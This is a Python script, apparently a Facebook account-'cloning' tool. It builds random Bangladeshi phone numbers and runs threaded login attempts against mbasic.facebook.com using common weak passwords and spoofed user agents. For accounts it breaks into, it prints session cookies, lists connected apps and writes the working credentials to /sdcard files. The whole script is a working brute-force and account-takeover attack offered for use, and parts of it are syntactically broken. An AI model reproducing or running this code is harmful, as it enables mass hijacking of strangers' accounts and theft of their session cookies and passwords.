# create by saiful 
# saiful bad boy
#saiful 420 gst
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
def o():
    os.system('clear')
    print(logo)
    print(" \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××")
    jalan(" \033[38;5;196m[\033[38;5;195m1\033[38;5;196m]\033[38;5;195m 𝐑𝐄𝐀𝐍𝐃𝐎𝐌 ")
    print(" \033[38;5;196m[\033[38;5;195m2\033[38;5;196m]\033[38;5;195m MY FB ACCOUNT")
    #print(" \033[38;5;196m[\033[38;5;195m3\033[38;5;196m]\033[38;5;195m MY FB GROUP")
    #print(" \033[38;5;196m[\033[38;5;195m4\033[38;5;196m]\033[38;5;195m MY GITHUB ACCOUNT")
    #print(" \033[38;5;196m[\033[38;5;195m0\033[38;5;196m]\033[38;5;195m EXIT")
    print(" \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××")
    SAIFUL = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m Choice Option \033[38;5;196m: ')
    if SAIFUL == '1':
        saiful()
    if SAIFUL == '2':
        os.system('xdg-open https://www.facebook.com/gangstter.ceo?mibextid=ZbWKwL')
        return None
    #if saiful == '3':
        #os.system('xdg-open ')
        return None
    #if saiful == '4':
        #os.system('xdg-open ')
        return None
    #if saiful == '0':
        os.system('exit')
        return None
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;196mSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \033[38;5;196m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;196m Sorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \033[38;5;196m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system("clear")
jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mcreate \033[0;34mby saiful \033[0;32mvai...............')
jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mupdate \033[0;32mdone.............')
jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mFOLLOW MY FB ACCOUNT............')
os.system('xdg-open https://www.facebook.com/gangstter.ceo?mibextid=ZbWKwL')
logo =("""\033[0;92m
\033[1;32m  ███████╗ █████╗ ██╗███████╗██╗   ██╗██╗     
\033[93;1m  ██╔════╝██╔══██╗██║██╔════ ██║   ██║██║     
\033[93;1m  ███████╗███████║██║█████╗  ██║   ██║██║     
\033[93;1m  ╚════██║██╔══██║██║██╔══╝  ██║   ██║██║     
\033[1;32m  ███████║██║  ██║██║██║     ╚██████╔╝███████╗
\033[1;32m  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝ ╚══════╝                                                                                               
  
\033[1;37m╔\033[1;36mGST\033[93;1m═══════════════════\033[1;36mGST✯𝐓𝐄𝐀𝐌\033[93;1m═════════════════\033[1;36m𝐆𝐒𝐓\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32m𝗔𝗨𝗧𝗛𝗘𝗥     \033[1;31m➟   \033[1;32m𝐌𝐃 𝐒𝐀𝐈𝐅𝐔𝐋 𝐈𝐒𝐋𝐀𝐌	           \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32m𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞   \033[1;31m➟   \033[1;32m𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈 (𝐁𝐋𝐀𝐍𝐊) 	           \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32m𝗚𝗜𝗧𝗛𝗨𝗕    \033[1;31m ➟  \033[1;32m 𝐒𝐀𝐈𝐅𝐔𝐋-𝐆𝐒𝐓𝟒𝟐𝟎                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32m𝗬𝗢𝗨𝗧𝗨𝗕𝗘   \033[1;31m ➟   \033[1;32m𝐒𝐑.𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈                \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32m𝗩𝗘𝗥𝗦𝗜𝗢𝗡   \033[1;31m ➟   \033[1;32m𝟑.𝟗.𝟎                        \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32m𝗚𝗥𝗢𝗨𝗣\033[1;31m : \033[1;32m𝐒𝐀𝐈𝐅𝐔𝐋-𝐇𝐀𝐂𝐊𝐄𝐑𝟒𝟐𝟎 	     \033[1;37m {\033[1;36mGST\033[1;37m}        \033[1;31m│
\033[1;37m╚\033[1;36mGST\033[93;1m══════\033[41m\033[1;37m[ 𓆩.𝐆𝐄𝐒𝐓..𓆪 𓆩𝐒𝐘𝐁𝐄𝐑𓆪  𓆩.𝐓𝐄𝐄𝐌.𓆪 ]\033[93;1m══════\033[1;36m𝐆𝐒𝐓\033[1;37m╝\033[93;1m

\033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30m𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m● 
 \033[1;91m[\033[1;97m✔️\033[1;91m]\033[1;32m 𝐆𝐒𝐓.....
 \033[1;91m[\033[1;97m✔️\033[1;91m]\033[1;32m 𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈....
 \033[1;91m[\033[1;97m✔️\033[1;91m]\033[1;32m 𝐒𝐀𝐈𝐅𝐔𝐋-𝐆𝐒𝐓....
 \033[1;91m[\033[1;97m✔️\033[1;91m]\033[1;32m 𝐎𝐍𝐋𝐘 𝐑𝐄𝐀𝐍𝐃𝐎𝐌....
\033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30m𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m●\n """) 
def linex():
	print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
cps = []

def hoga_check():
  uuid =  str(os.geteuid()) + str(os.getlogin()) 
  id = "𝐒𝐀𝐈𝐅𝐔𝐋 𝐕𝐀𝐈-X-x0x0x" + "|".join(uuid)
  os.system("clear")
  print(logo)
  print("\033[38;5;46m  ❥▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃❦")
  print("\x1b[1;92m  ➠  𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐈𝐒\033[38;5;46m : "+id) 
  try: 
    httpCaht = requests.get("https://github.com/SAIFUL-GST420/approval.txt/blob/main/Approval.txt").text 
    if id in httpCaht: 
      jalan("\x1b[1;96m  ➠   𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐒𝐓𝐀𝐓𝐔𝐒: 𝐀𝐂𝐓𝐈𝐕𝐄  \033[97;1m  ✔ ") 
      msg = str(os.geteuid()) 
      time.sleep(0.3) 
      pass 
    else: 
      jalan("\x1b[38;5;248m  ➠  𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐈𝐒 𝐍𝐎𝐓 𝐀𝐂𝐓𝐈𝐕𝐄\33[97;1m ✘") 
      jalan("\x1b[38;5;208m  ➠  𝐂𝐎𝐏𝐘 𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐒𝐄𝐍𝐓 ??𝐔𝐓𝐇𝐎??") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print(logo) 
     hoga_check()
hoga_check()	
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[38;5;196mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[38;5;196mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :saiful = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :saiful = ' ~> 2009'
        elif uid[:8] in ['10000000']        :saiful = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:saiful = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:saiful = ' 2010'
        elif uid[:6] in ['100001']          :saiful = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :saiful = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :saiful = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :saiful = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :saiful = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :saiful = ' ~> 2015'
        elif uid[:5] in ['10001']           :saiful = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :saiful = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :saiful = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :saiful = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :saiful = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:saiful = ' ~> 2021'
        elif uid[:5] in ['10008']           :saiful = ' ~>2022'
        elif uid[:5] in ['10009']           :saiful = ' ~> 2023'
        else:saiful=''
    elif len(uid) in [9,10]:
        saiful = ' ~> 2008/2009'
    elif len(uid)==8:
        saiful = ' ~> 2007/2008'
    elif len(uid)==7:
        saiful = ' ~> 2006/2007'
    else:saiful=''
    return saiful
    
    
    
# APK CHECK
def saiful():
    user=['Mozilla/5.0 (Macintosh; Intel Mac OS X 12.3; rv:99.0) Gecko/20100101 Firefox/99.0']
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m Example : \033[38;5;45m019,\033[38;5;46m017,\033[38;5;45m018,\033[38;5;192m016{x}')
    print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;45m Choose : \033[38;5;46m')
    print("")
    os.system('clear')
    print(logo)
    print(" \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m Example : \033[38;5;45mfreefire, \033[38;5;48mbangladesh , \033[38;5;46mi love you, \033[1;95mEnc ")
    print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
    po = input(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m CHOOSE YOUR PASSWORD :{H} \033[38;5;46m')
    pok = po.lower()
    print("")
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m EXAMPLE : \033[38;5;45m2000, \033[38;5;46m3000, \033[38;5;45m5000 \n \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××× \n \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;45m PUT CLONING LIMIT:\033[38;5;46m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as setu:
        clear()
        tl = str(len(user))
        print('\033[93;1m●\x1b[1;92m▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\033[47m\x1b[1;92m𝐆𝐒𝐓\033[40m\033[00m\033[93;1m▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\033[93;1m●')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐂𝐇𝐎𝐎𝐒𝐄 𝐘𝐎𝐔𝐑 𝐂𝐎𝐎𝐃𝐄 \033[38;5;196m: \033[38;5;46m'+code)
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐘𝐎𝐔𝐑 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐒 : {xr}\033[38;5;46m'+tl)
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐔𝐬𝐞𝐫 𝐚𝐠𝐞𝐧𝐭 : 20000')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐦𝐨𝐛𝐢𝐥𝐞 𝐝𝐚𝐭𝐚 + 𝐰𝐢𝐟𝐢 𝐨𝐧')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐓𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐮𝐬𝐞 𝐚𝐢𝐫𝐩𝐥𝐚𝐧𝐞 𝐦𝐨𝐝𝐞 𝐢𝐟 𝐨𝐤 𝐢𝐝𝐬')
        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐒𝐀𝐈𝐅𝐔𝐋 𝐎𝐍 𝐅𝐈𝐑𝐄')
        print('\033[93;1m●\x1b[1;92m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[47m\x1b[1;92m𝐆𝐒𝐓\033[40m\033[00m\033[93;1m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[93;1m●')
        for love in user:
            pwx = [(code+love), (pok), (love), ("bangladesh","freefire","iloveyou","freefirelover","pubglovar")]
            uid = code+love
            setu.submit(rcrack,uid,pwx,tl)
    print(f"\n{x}  \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
   		 "method": 'GET',
     	  "scheme": 'https',
   		 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     	   'accept-language': 'en-ZA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    		'cache-control': 'max-age=0',
	        'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    		'sec-ch-ua-mobile': '?1',
   	     'sec-ch-ua-platform': '"Android"',
   		 'sec-fetch-dest': 'document',
    		'sec-fetch-mode': 'navigate',
   		 'sec-fetch-site': 'none',
   		 'sec-fetch-user': '?1',
    		'upgrade-insecure-requests': '1',
  		  'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('    \033[38;5;45m[𝗦𝗔𝗜𝗙𝗨𝗟-𝗢𝗞🔥] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[Usar Agent🤖]\033[38;5;195m'+pro+' \033[1;91m ')
                print(f'    \033[38;5;46m[COOKIE🍪] \033[38;5;192m'+coki)
                cek_apk(session,coki)
                open('/sdcard/𝗦𝗔𝗜𝗙𝗨𝗟-𝗢𝗞.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\r\r\33[1;31m [𝗦𝗔𝗜𝗙𝗨𝗟-𝗖𝗣😫] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/𝗦𝗔𝗜𝗙𝗨𝗟-𝗖𝗣.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[\033[1;92m𝗦𝗔𝗜𝗙𝗨𝗟-𝐕𝐀𝐈\033[1;97m] > [%s/%s] > [𝗢𝗞\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

o()
